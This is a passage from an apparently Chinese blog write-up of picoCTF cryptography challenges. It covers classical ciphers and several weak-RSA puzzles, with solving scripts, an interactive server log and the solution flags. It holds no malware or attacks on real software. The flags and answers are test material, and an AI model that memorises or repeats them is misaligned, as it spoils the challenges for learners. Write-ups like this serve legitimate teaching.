src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210216134805094.png" alt="image-20210216134805094"></p><p>注意，题目说解密出来的要为大写</p><p>最后flag为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;CRYPTOISFUN&#125;</span><br></pre></td></tr></table></figure><h2 id="4-13（100）"><a href="#4-13（100）" class="headerlink" title="4.13（100）"></a>4.13（100）</h2><p>题目：<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210216134946000.png" alt="image-20210216134946000"></p><p>看到题目，第一反应是rot13，拿去解密试一试</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210216135012220.png" alt="image-20210216135012220"></p><p>得到flag（CTF要大写）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;not_too_bad_of_a_problem&#125;</span><br></pre></td></tr></table></figure><h2 id="5-la-cifra-de（200）"><a href="#5-la-cifra-de（200）" class="headerlink" title="5.la cifra de（200）"></a>5.la cifra de（200）</h2><p>要交互得到一串密文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">﻿Ne iy nytkwpsznyg nth it mtsztcy vjzprj zfzjy rkhpibj nrkitt ltc tnnygy ysee itd tte cxjltk</span><br><span class="line"></span><br><span class="line">Ifrosr tnj noawde uk siyyzre, yse Bnretèwp Cousex mls hjpn xjtnbjytki xatd eisjd</span><br><span class="line"></span><br><span class="line">Iz bls lfwskqj azycihzeej yz Brftsk ip Volpnèxj ls oy hay tcimnyarqj dkxnrogpd os 1553 my Mnzvgs Mazytszf Merqlsu ny hox moup Wa inqrg ipl. Ynr. Gotgat Gltzndtg Gplrfdo </span><br><span class="line"></span><br><span class="line">Ltc tnj tmvqpmkseaznzn uk ehox nivmpr g ylbrj ts ltcmki my yqtdosr tnj wocjc hgqq ol fy oxitngwj arusahje fuw ln guaaxjytrd catizm tzxbkw zf vqlckx hizm ceyupcz yz tnj fpvjc hgqqpohzCZK&#123;m311a50_0x_a1rn3x3_h1ah3x7g996649&#125;</span><br><span class="line"></span><br><span class="line">Ehk ktryy herq-ooizxetypd jjdcxnatoty ol f aordllvmlbkytc inahkw socjgex, bls sfoe gwzuti 1467 my Rjzn Hfetoxea Gqmexyt.</span><br><span class="line"></span><br><span class="line">Tnj Gimjyèrk Htpnjc iy ysexjqoxj dosjeisjd cgqwej yse Gqmexyt Doxn ox Fwbkwei Inahkw.</span><br><span class="line"></span><br><span class="line">Tn 1508, Ptsatsps Zwttnjxiax tnbjytki ehk xz-cgqwej ylbaql rkhea (g rltxni ol xsilypd gqahggpty) ysaz bzuri wazjc bk f nroytcgq nosuznkse ol yse Bnretèwp Cousex.</span><br><span class="line"></span><br><span class="line">Gplrfdo’y xpcuso butvlky lpvjlrki tn 1555 gx l cuseitzltoty ol yse lncsz. Yse rthex mllbjd ol yse gqahggpty fce tth snnqtki cemzwaxqj, bay ehk fwpnfmezx lnj yse osoed qptzjcs gwp mocpd hd xegsd ol f xnkrznoh vee usrgxp, wnnnh ify bk itfljcety hizm paim noxwpsvtydkse.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一开始词频分析不出，然后拿去未知密钥猜测维吉尼亚解密，成功解得密文，。key为flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">﻿It is interesting how in history people often receive credit for things they did not create</span><br><span class="line"></span><br><span class="line">During the course of history, the Vigenère Cipher has been reinvented many times</span><br><span class="line"></span><br><span class="line">It was falsely attributed to Blaise de Vigenère as it was originally described in 1553 by Giovan Battista Bellaso in his book La cifra del. Sig. Giovan Battista Bellaso </span><br><span class="line"></span><br><span class="line">For the implementation of this cipher a table is formed by sliding the lower half of an ordinary alphabet for an apparently random number of places with respect to the upper halfpicoCTF&#123;b311a50_0r_v1gn3r3_c1ph3r7b996649&#125;</span><br><span class="line"></span><br><span class="line">The first well-documented description of a polyalphabetic cipher however, was made around 1467 by Leon Battista Alberti.</span><br><span class="line"></span><br><span class="line">The Vigenère Cipher is therefore sometimes called the Alberti Disc or Alberti Cipher.</span><br><span class="line"></span><br><span class="line">In 1508, Johannes Trithemius invented the so-called tabula recta (a matrix of shifted alphabets) that would later be a critical component of the Vigenère Cipher.</span><br><span class="line"></span><br><span class="line">Bellaso’s second booklet appeared in 1555 as a continuation of the first. The lower halves of the alphabets are now shifted regularly, but the alphabets and the index letters are mixed by means of a mnemonic key phrase, which can be different with each correspondent.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>get flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;b311a50_0r_v1gn3r3_c1ph3r7b996649&#125;</span><br></pre></td></tr></table></figure><h2 id="6-rsa-pop-quiz（200）"><a href="#6-rsa-pop-quiz（200）" class="headerlink" title="6.rsa-pop-quiz（200）"></a>6.rsa-pop-quiz（200）</h2><p>交互来考你rsa基础</p><p>脚本如下(懒得整理了，，hhh)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1</span></span><br><span class="line">q = <span class="number">66347</span></span><br><span class="line">p = <span class="number">12611</span></span><br><span class="line"><span class="comment">#n=4636878989</span></span><br><span class="line">print(q*p)</span><br><span class="line">print(<span class="number">5051846941</span>//<span class="number">54269</span>)</span><br><span class="line">print((p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m=<span class="comment">#</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line"><span class="comment">#求c</span></span><br><span class="line">n=<span class="comment">#</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#求d</span></span><br><span class="line">q = <span class="comment">#</span></span><br><span class="line">p =<span class="comment">#</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d=invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#求m，</span></span><br><span class="line">p =<span class="comment">#</span></span><br><span class="line">ciphertext =<span class="comment">#</span></span><br><span class="line">e =<span class="number">65537</span></span><br><span class="line">n =<span class="comment">#</span></span><br><span class="line">q=n//p</span><br><span class="line">d=invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m=<span class="built_in">pow</span>(ciphertext,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>解题如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">[x] Opening connection to jupiter.challenges.picoctf.org on port <span class="number">58617</span></span><br><span class="line">[x] Opening connection to jupiter.challenges.picoctf.org on port <span class="number">58617</span>: Trying <span class="number">3.131</span><span class="number">.60</span><span class="number">.8</span></span><br><span class="line">[+] Opening connection to jupiter.challenges.picoctf.org on port <span class="number">58617</span>: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Good morning <span class="class"><span class="keyword">class</span>! <span class="title">It</span>&#x27;<span class="title">s</span> <span class="title">me</span> <span class="title">Ms</span>. <span class="title">Adleman</span>-<span class="title">Shamir</span>-<span class="title">Rivest</span></span></span><br><span class="line">Today we will be taking a pop quiz, so I hope you studied. Cramming just will not do!</span><br><span class="line">You will need to tell me <span class="keyword">if</span> each example <span class="keyword">is</span> possible, given your extensive crypto knowledge.</span><br><span class="line">Inputs <span class="keyword">and</span> outputs are <span class="keyword">in</span> decimal. No <span class="built_in">hex</span> here!</span><br><span class="line"><span class="comment">#### NEW PROBLEM ####</span></span><br><span class="line">q : <span class="number">60413</span></span><br><span class="line">p : <span class="number">76753</span></span><br><span class="line"><span class="comment">##### PRODUCE THE FOLLOWING ####</span></span><br><span class="line">n</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line"><span class="comment">#### TIME TO SHOW ME WHAT YOU GOT! ###</span></span><br><span class="line">n: <span class="number">4636878989</span></span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### NEW PROBLEM ####</span></span><br><span class="line">p : <span class="number">54269</span></span><br><span class="line">n : <span class="number">5051846941</span></span><br><span class="line"><span class="comment">##### PRODUCE THE FOLLOWING ####</span></span><br><span class="line">q</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line"><span class="comment">#### TIME TO SHOW ME WHAT YOU GOT! ###</span></span><br><span class="line">q: <span class="number">93089</span></span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### NEW PROBLEM ####</span></span><br><span class="line">e : <span class="number">3</span></span><br><span class="line">n : <span class="comment">#</span></span><br><span class="line"><span class="comment">##### PRODUCE THE FOLLOWING ####</span></span><br><span class="line">q</span><br><span class="line">p</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):n</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### NEW PROBLEM ####</span></span><br><span class="line">q : <span class="number">66347</span></span><br><span class="line">p : <span class="number">12611</span></span><br><span class="line"><span class="comment">##### PRODUCE THE FOLLOWING ####</span></span><br><span class="line">totient(n)</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line"><span class="comment">#### TIME TO SHOW ME WHAT YOU GOT! ###</span></span><br><span class="line">totient(n): <span class="number">836623060</span></span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### NEW PROBLEM ####</span></span><br><span class="line">plaintext : <span class="number">6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717</span></span><br><span class="line">e : <span class="number">3</span></span><br><span class="line">n : <span class="comment">#</span></span><br><span class="line"><span class="comment">##### PRODUCE THE FOLLOWING ####</span></span><br><span class="line">ciphertext</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line"><span class="comment">#### TIME TO SHOW ME WHAT YOU GOT! ###</span></span><br><span class="line">ciphertext: <span class="comment">#</span></span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### NEW PROBLEM ####</span></span><br><span class="line">ciphertext : <span class="number">107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323</span></span><br><span class="line">e : <span class="number">3</span></span><br><span class="line">n : <span class="comment">#</span></span><br><span class="line"><span class="comment">##### PRODUCE THE FOLLOWING ####</span></span><br><span class="line">plaintext</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):n</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### NEW PROBLEM ####</span></span><br><span class="line">q : <span class="number">92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559</span></span><br><span class="line">p : <span class="number">97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637</span></span><br><span class="line">e : <span class="number">65537</span></span><br><span class="line"><span class="comment">##### PRODUCE THE FOLLOWING ####</span></span><br><span class="line">d</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line"><span class="comment">#### TIME TO SHOW ME WHAT YOU GOT! ###</span></span><br><span class="line">d: <span class="number">1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729</span></span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### NEW PROBLEM ####</span></span><br><span class="line">p : <span class="number">153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433</span></span><br><span class="line">ciphertext : <span class="comment">#</span></span><br><span class="line">e : <span class="number">65537</span></span><br><span class="line">n : <span class="comment">#</span></span><br><span class="line"><span class="comment">##### PRODUCE THE FOLLOWING ####</span></span><br><span class="line">plaintext</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line"><span class="comment">#### TIME TO SHOW ME WHAT YOU GOT! ###</span></span><br><span class="line">plaintext: picoCTF&#123;wA8_th4t$_ill3aGal..o26cefcb2&#125;</span><br><span class="line">That<span class="string">&#x27;s not an int! Exiting</span></span><br><span class="line"><span class="string">[*] Got EOF while reading in interactive</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h2 id="7-Tapping-200"><a href="#7-Tapping-200" class="headerlink" title="7.Tapping (200)"></a>7.Tapping (200)</h2><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210216161305871.png" alt="image-20210216161305871"></p><p>交互得到一串摩斯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.--. .. -.-. --- -.-. - ..-. &#123; -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. ...-- ----. ----- ..--- ----- .---- ----. ..... .---- ----. &#125; </span><br></pre></td></tr></table></figure><p>提示摩斯密码，直接在线网站解密即可。</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210216161151106.png" alt="image-20210216161151106"></p><p>题目要求大写，</p><p>get flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PICOCTF&#123;M0RS3C0D31SFUN3902019519&#125;</span><br></pre></td></tr></table></figure><h2 id="8-Mr-Worldwide-200"><a href="#8-Mr-Worldwide-200" class="headerlink" title="8.Mr-Worldwide(200)"></a>8.Mr-Worldwide(200)</h2><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210216162326751.png" alt="image-20210216162326751"></p><p>??这哪里是密码题，这明明是misc题好吧。。。。是我菜了</p><p>从网上找到的，原来是地理坐标</p><p>网上的脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;picoCTF&#123;(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_letter_from_coordinate</span>(<span class="params">match</span>):</span></span><br><span class="line">    lat = match.group(<span class="number">1</span>)</span><br><span class="line">    long = match.group(<span class="number">2</span>)</span><br><span class="line">    r = requests.get(<span class="string">&quot;https://geocode.xyz/&#123;&#125;,&#123;&#125;?json=1&quot;</span>.<span class="built_in">format</span>(lat, long))</span><br><span class="line">    j = r.json()</span><br><span class="line">    <span class="keyword">return</span> j[<span class="string">&quot;geocode&quot;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (re.sub(<span class="string">r&#x27;\(([\d\.-]+), ([\d\.-]+)\)&#x27;</span>, get_letter_from_coordinate, flag))</span><br></pre></td></tr></table></figure><h2 id="9-Flags"><a href="#9-Flags" class="headerlink" title="9.Flags"></a>9.Flags</h2><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210216162558089.png" alt="image-20210216162558089"></p><p>拿到图片，先是谷歌了一波国旗密码，然后发现一张相似的图，原来是国际信号旗。</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210216163840447.png" alt="image-20210216163840447"></p><p>对比可以得到flag,第二个我看不出是哪个，我看句意猜的1或者l，提交发现是1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PICOCTF&#123;F1AG5AND5TUFF&#125;</span><br></pre></td></tr></table></figure><h2 id="10-waves-over-lambda"><a href="#10-waves-over-lambda" class="headerlink" title="10.waves over lambda"></a>10.waves over lambda</h2><p>交互得到密文，提示说替换加密，长密文，可以词频攻击，题目说，不是正常的flag，拿去quipqiup尝试一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">npfhsgir qbsb cr xpls ejgh - esbvlbfnx_cr_n_ptbs_jgoykg_pheoglfsge</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">gjbdbx expkpsptcinq mgsgogupt agr iqb iqcsk rpf pe expkps wgtjptcinq mgsgogupt, g jgfk pafbs abjj mfpaf cf pls kcriscni cf qcr paf kgx, gfk ricjj sboboybsbk gopfh lr pacfh ip qcr hjppox gfk isghcn kbgiq, aqcnq qgwwbfbk iqcsibbf xbgsr ghp, gfk aqcnq c rqgjj kbrnscyb cf cir wspwbs wjgnb. eps iqb wsbrbfi c acjj pfjx rgx iqgi iqcr jgfkpafbseps rp ab lrbk ip ngjj qco, gjiqplhq qb qgskjx rwbfi g kgx pe qcr jceb pf qcr paf brigibagr g risgfhb ixwb, xbi pfb wsbiix esbvlbfijx ip yb obi aciq, g ixwb gyzbni gfk tcncplr gfk gi iqb rgob icob rbfrbjbrr. yli qb agr pfb pe iqprb rbfrbjbrr wbsrpfr aqp gsb tbsx abjj ngwgyjb pe jppmcfh geibs iqbcs apsjkjx geegcsr, gfk, gwwgsbfijx, geibs fpiqcfh bjrb. expkps wgtjptcinq, eps cfrigfnb, ybhgf aciq fbdi ip fpiqcfh; qcr brigib agr pe iqb rogjjbri; qb sgf ip kcfb gi piqbs obf&#39;r igyjbr, gfk egribfbk pf iqbo gr g ipgkx, xbi gi qcr kbgiq ci gwwbgsbk iqgi qb qgk g qlfksbk iqplrgfk splyjbr cf qgsk ngrq. gi iqb rgob icob, qb agr gjj qcr jceb pfb pe iqb opri rbfrbjbrr, egfigricngj ebjjpar cf iqb aqpjb kcriscni. c sbwbgi, ci agr fpi rilwckcixiqb ogzpscix pe iqbrb egfigricngj ebjjpar gsb rqsbak gfk cfibjjchbfi bfplhqyli zlri rbfrbjbrrfbrr, gfk g wbnljcgs fgicpfgj epso pe ci.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解密有</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210216165709299.png" alt="image-20210216165709299"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#frequency_is_c_over_lambda_ogfmaunraf</span></span><br></pre></td></tr></table></figure><h2 id="11-Mini-RSA"><a href="#11-Mini-RSA" class="headerlink" title="11.Mini RSA"></a>11.Mini RSA</h2><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210216165814643.png" alt="image-20210216165814643"></p><p>题目说密文有点小。</p><p>尝试直接开立方，发现刚好能开出来</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">N=<span class="comment">#</span></span><br><span class="line">e= <span class="number">3</span></span><br><span class="line"></span><br><span class="line">c=<span class="comment">#</span></span><br><span class="line">print(long_to_bytes(iroot(c,<span class="number">3</span>)[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#picoCTF&#123;n33d_a_lArg3r_e_ccaa7776&#125;</span></span><br></pre></td></tr></table></figure><h2 id="12-b00tl3gRSA2-400"><a href="#12-b00tl3gRSA2-400" class="headerlink" title="12.b00tl3gRSA2 (400)"></a>12.b00tl3gRSA2 (400)</h2><p>题目提示</p><p>e过大，明显wiener攻击。</p><p>使用wiener求出d</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210216170350724.png" alt="image-20210216170350724"></p><p>解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c= <span class="comment">#</span></span><br><span class="line">n=<span class="comment">#</span></span><br><span class="line">e= <span class="comment">#</span></span><br><span class="line">d=<span class="number">65537</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"><span class="comment">#picoCTF&#123;bad_1d3a5_2438125&#125;</span></span><br></pre></td></tr></table></figure><h2 id="13-b00tl3gRSA3-450"><a href="#13-b00tl3gRSA3-450" class="headerlink" title="13.b00tl3gRSA3(450)"></a>13.b00tl3gRSA3(450)</h2><p>使用sagemath分解n（factor这个分解网站，分解不全）</p><p>然后欧拉公式一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">32557389449378384941192235200994490919940383794534593802190680855915601918370583240653526198087740046258513690710298373104250558968390278137045121995640423198855609902391775281059401649812259059241165815244352545204978087592539801185203809665198615006623898232399002339445325123499498499686072686389455494895527047480376531287304623297791267983</span></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">phi=(<span class="number">8728546663</span>-<span class="number">1</span>) * (<span class="number">8815815893</span>-<span class="number">1</span>) * (<span class="number">9127238929</span>-<span class="number">1</span>) * (<span class="number">9669671941</span>-<span class="number">1</span>) * (<span class="number">9698775707</span>-<span class="number">1</span>) * (<span class="number">10583106433</span>-<span class="number">1</span>) * (<span class="number">10646560469</span>-<span class="number">1</span>) * (<span class="number">10901300387</span>-<span class="number">1</span>) * (<span class="number">10983844747</span>-<span class="number">1</span>) * (<span class="number">11463873247</span>-<span class="number">1</span>) * (<span class="number">11469287437</span>-<span class="number">1</span>) *( <span class="number">11512271083</span>-<span class="number">1</span>) * (<span class="number">11600607341</span>-<span class="number">1</span>) * (<span class="number">12004319879</span>-<span class="number">1</span>) * (<span class="number">12263143679</span>-<span class="number">1</span>) * (<span class="number">12468244849</span>-<span class="number">1</span>) * (<span class="number">12481181003</span>-<span class="number">1</span>) * (<span class="number">12784231927</span>-<span class="number">1</span> )* (<span class="number">12812786431</span>-<span class="number">1</span> )* (<span class="number">12859729073</span>-<span class="number">1</span>) * (<span class="number">13487257013</span>-<span class="number">1</span>) * (<span class="number">14220665483</span>-<span class="number">1</span>) * (<span class="number">14455028897</span>-<span class="number">1</span>) * (<span class="number">14654963717</span>-<span class="number">1</span>) * (<span class="number">14877242423</span>-<span class="number">1</span>) *( <span class="number">14940966541</span>-<span class="number">1</span>) * (<span class="number">14970047137</span>-<span class="number">1</span>) * (<span class="number">15441508729</span>-<span class="number">1</span> )* (<span class="number">15501642539</span>-<span class="number">1</span>) * (<span class="number">15923168641</span>-<span class="number">1</span>) * (<span class="number">16772015417</span>-<span class="number">1</span> )* (<span class="number">16965681737</span>-<span class="number">1</span>) * (<span class="number">17164517231</span>-<span class="number">1</span>) * (<span class="number">17179290413</span>-<span class="number">1</span>)</span><br><span class="line">d=invert(e,phi)</span><br><span class="line">c=<span class="number">14441429338814479976193164909822224398131899845926850099663557672695828202794654929234833263345880508675453823312002187197536428362581566328646360011277250948526077584341045151142394695988809676106473276741547955853516568377631208634132230189129103999233936978765514973754166291653344263062199312822789088402819274081374912278986058251333622388</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#picoCTF&#123;too_many_fact0rs_4025135&#125;</span></span><br></pre></td></tr></table></figure><p>14.</p><p>使用openssl指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -pubkey -noout -<span class="keyword">in</span> cert.pem &gt; key.pub</span><br><span class="line">openssl rsa -pubin -<span class="keyword">in</span> key.pub -text</span><br></pre></td></tr></table></figure><p>会得到公钥文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>在线网站解析一下即可。也可以用openssl提取。然后将n后分解。</p><figure 